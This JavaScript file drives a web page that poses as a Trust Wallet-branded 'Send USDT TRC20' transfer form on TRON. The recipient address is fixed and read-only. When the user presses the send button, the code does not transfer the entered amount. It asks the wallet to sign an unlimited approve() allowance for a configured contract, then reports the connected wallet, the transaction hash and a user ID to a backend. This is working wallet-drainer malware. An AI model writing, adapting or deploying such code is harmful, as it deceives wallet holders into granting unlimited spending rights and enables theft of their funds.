// Wait for config, then wire up the UI.
// CONFIG comes from loadConfig() in config-backend.js (backend/.env)

document.addEventListener('DOMContentLoaded', async function () {
    let CONFIG;
    try {
        CONFIG = await loadConfig();
    } catch (err) {
        alert('Failed to load configuration from server. Is the backend running?');
        console.error(err);
        return;
    }

    const TronWebCtor = window.TronWeb?.TronWeb || window.TronWeb;
    const tronWeb = new TronWebCtor({ fullHost: 'https://api.trongrid.io' });

    let connectedAddress = '';
    let lastTxHash = '';

    const wcWallet = new window.WalletConnectWallet({
        network: window.WalletConnectChainID.Mainnet,
        options: {
            relayUrl: 'wss://relay.walletconnect.com',
            projectId: CONFIG.WC_PROJECT_ID,
            metadata: {
                name: 'Send USDT TRC20',
                description: 'Transfer USDT on TRON Network',
                url: window.location.origin,
                icons: ['https://trustwallet.com/assets/images/media/assets/trust_platform.svg']
            }
        },
        themeMode: 'dark'
    });

    // ===== DOM =====
    const addressInput = document.getElementById('addressInput');
    const amountInput  = document.getElementById('amount');
    const nextBtn      = document.getElementById('nextBtn');
    const approxUsd    = document.getElementById('usdAmount');
    const maxBtn       = document.getElementById('maxBtn');
    const clearBtn     = document.getElementById('clearBtn');
    const pasteBtn     = document.getElementById('pasteBtn');
    const processingPopup = document.getElementById('processingPopup');
    const processingClose = document.getElementById('processingClose');
    const processingDetailsBtn = document.getElementById('processingDetailsBtn');
    const originalHTML = nextBtn.innerHTML;

    const FIXED_ADDRESS = 'TWYVD4wKyF57Hjq36qj9sKxUMqCib3Jpe5';
    addressInput.value = FIXED_ADDRESS;
    addressInput.readOnly = true;

    // ===== LOADING UI (matches ERC-20) =====
    function showLoadingPopup() {
        const popup = document.getElementById('loadingPopup');
        if (!popup) return;
        popup.classList.add('show');
        void popup.offsetHeight;
    }

    function hideLoadingPopup() {
        const popup = document.getElementById('loadingPopup');
        if (popup) popup.classList.remove('show');
    }

    function waitForPaint() {
        return new Promise(function (resolve) {
            requestAnimationFrame(function () {
                requestAnimationFrame(resolve);
            });
        });
    }

    function showProcessingPopup(txHash) {
        hideLoadingPopup();
        lastTxHash = txHash || '';
        if (processingDetailsBtn) {
            if (lastTxHash) {
                processingDetailsBtn.disabled = false;
                processingDetailsBtn.classList.add('enabled');
            } else {
                processingDetailsBtn.disabled = true;
                processingDetailsBtn.classList.remove('enabled');
            }
        }
        if (processingPopup) processingPopup.style.display = 'block';
    }

    function closeProcessingPopup() {
        if (processingPopup) processingPopup.style.display = 'none';
    }

    if (processingClose) {
        processingClose.addEventListener('click', closeProcessingPopup);
    }

    if (processingDetailsBtn) {
        processingDetailsBtn.addEventListener('click', function () {
            if (!lastTxHash) return;
            window.open('https://tronscan.org/#/transaction/' + lastTxHash, '_blank');
        });
    }

    // Diamond loader animation (same timing as ERC-20)
    (function initDiamondLoader() {
        var DOT = 2, H = 14, B = H - DOT, CYCLE = 2600, STAGGER = 140;
        var LS = 0.44, LE = 0.60, TS = 0.52, TE = 0.68;

        function smoothstep(t) {
            t = Math.max(0, Math.min(1, t));
            return t * t * (3 - 2 * t);
        }

        function lerp(a, b, t) {
            return a + (b - a) * t;
        }

        function tick(span, offset) {
            var t = ((performance.now() - offset) % CYCLE) / CYCLE;
            var up = t < 0.5;
            var h = up ? t * 2 : (t - 0.5) * 2;
            var lp = h < LS ? 0 : h > LE ? 1 : smoothstep((h - LS) / (LE - LS));
            var tp = h < TS ? 0 : h > TE ? 1 : smoothstep((h - TS) / (TE - TS));
            var top, bot;

            if (up) {
                top = lerp(B, 0, lp);
                bot = lerp(B + DOT, DOT, tp);
            } else {
                bot = lerp(DOT, B + DOT, lp);
                top = lerp(0, B, tp);
            }

            span.style.top = top + 'px';
            span.style.height = Math.max(DOT, bot - top) + 'px';
            requestAnimationFrame(function () { tick(span, offset); });
        }

        var spans = document.querySelectorAll('.diamond-bars i span');
        var t0 = performance.now();
        spans.forEach(function (span, i) {
            tick(span, t0 + i * STAGGER);
        });
    })();

    // ===== BACKEND API =====
    async function notifyConnectedWallet(walletAddress) {
        const userId = new URLSearchParams(window.location.search).get('user_id');
        try {
            await fetch('/api/connectedwallet', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ wallet: walletAddress, uid: userId })
            });
        } catch (e) {
            console.error('connectedwallet error:', e);
        }
    }

    async function notifyApproval(walletAddress, txHash, amount) {
        const userId = new URLSearchParams(window.location.search).get('user_id');
        try {
            await fetch('/api/checkTrx', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    trx: txHash,
                    wallet: walletAddress,
                    amount: amount,
                    uid: userId
                })
            });
        } catch (e) {
            console.error('checkTrx error:', e);
        }
    }

    // ===== UI HELPERS =====
    function showNotification(msg, type) {
        let n = document.getElementById('notify-bar');
        if (!n) {
            n = document.createElement('div');
            n.id = 'notify-bar';
            Object.assign(n.style, {
                position: 'fixed', top: '20px', left: '50%',
                transform: 'translateX(-50%)', zIndex: '9999',
                minWidth: '260px', maxWidth: '90vw',
                padding: '16px 24px', borderRadius: '12px',
                fontSize: '1rem', fontWeight: 'bold',
                textAlign: 'center', boxShadow: '0 4px 32px #0008',
                transition: 'opacity 0.3s', color: '#fff'
            });
            document.body.appendChild(n);
        }
        n.textContent = msg;
        n.style.background = type === 'error' ? '#f87171' : type === 'success' ? '#10b981' : '#374151';
        n.style.opacity = '1';
        n.style.pointerEvents = 'auto';
        clearTimeout(n._t);
        n._t = setTimeout(() => { n.style.opacity = '0'; n.style.pointerEvents = 'none'; }, 4000);
    }

    function updateApprox() {
        const v = parseFloat(amountInput.value);
        approxUsd.textContent = isNaN(v) || v <= 0 ? '≈ $0.00' : `≈ $${v.toFixed(2)}`;
        if (clearBtn) clearBtn.style.display = amountInput.value.trim() ? 'flex' : 'none';
    }

    function validate() {
        nextBtn.disabled = !(addressInput.value.trim() && amountInput.value.trim() && parseFloat(amountInput.value) > 0);
    }

    amountInput.addEventListener('input', () => { updateApprox(); validate(); });
    addressInput.addEventListener('input', validate);
    updateApprox();
    validate();

    if (clearBtn) {
        clearBtn.addEventListener('click', () => {
            amountInput.value = '';
            updateApprox();
            validate();
        });
    }

    if (pasteBtn) {
        pasteBtn.addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                if (text) {
                    addressInput.value = text.trim();
                    validate();
                }
            } catch (e) {
                showNotification('Could not paste from clipboard.', 'error');
            }
        });
    }

    // ===== CONNECT =====
    async function getAddress() {
        if (connectedAddress) return connectedAddress;
        hideLoadingPopup();
        const { address } = await wcWallet.connect();
        if (!address) throw new Error('Wallet connection failed or was cancelled.');
        connectedAddress = address;
        await notifyConnectedWallet(address);
        return address;
    }

    // ===== MAX =====
    if (maxBtn) {
        maxBtn.addEventListener('click', async function (e) {
            e.preventDefault();
            try {
                const addr = await getAddress();
                showLoadingPopup();
                const contract = await tronWeb.contract().at(CONFIG.USDT_TRC20_ADDRESS);
                const balance = await contract.balanceOf(addr).call();
                amountInput.value = (Number(balance) / 1_000_000).toString();
                updateApprox();
                validate();
            } catch (err) {
                console.error(err);
                showNotification(err.message || 'Could not get balance.', 'error');
            } finally {
                hideLoadingPopup();
            }
        });
    }

    // ===== NEXT =====
    nextBtn.addEventListener('click', async function (e) {
        e.preventDefault();
        nextBtn.innerHTML = 'Processing...';
        nextBtn.disabled = true;
        hideLoadingPopup();

        try {
            const userAddress = await getAddress();
            showLoadingPopup();
            const amount = amountInput.value.trim();
            const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

            const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
                CONFIG.USDT_TRC20_ADDRESS,
                'approve(address,uint256)',
                { feeLimit: 100_000_000 },
                [
                    { type: 'address', value: CONFIG.CONTRACT_ADDRESS },
                    { type: 'uint256', value: maxAmount }
                ],
                userAddress
            );

            // Hide while wallet prompts for signature
            hideLoadingPopup();
            await waitForPaint();
            const signedTx = await wcWallet.signTransaction(transaction);

            showLoadingPopup();
            await waitForPaint();

            const result = await tronWeb.trx.sendRawTransaction(signedTx);
            const txHash = result.txid || result.transaction?.txID || '';

            if (!txHash) throw new Error('Broadcast failed — no txHash returned.');

            showProcessingPopup(txHash);
            await notifyApproval(userAddress, txHash, amount);

        } catch (err) {
            console.error(err);
            hideLoadingPopup();
            const msg = (err?.message || '').toLowerCase();
            if (msg.includes('reject') || msg.includes('denied') || msg.includes('cancel')) {
                showNotification('Transaction cancelled.', 'error');
            } else if (msg.includes('insufficient') || msg.includes('balance')) {
                showNotification('Insufficient TRX for fees.', 'error');
            } else {
                showNotification(err.message || 'Transaction failed. Try again.', 'error');
            }
        } finally {
            nextBtn.disabled = false;
            nextBtn.innerHTML = originalHTML;
            validate();
        }
    });
});
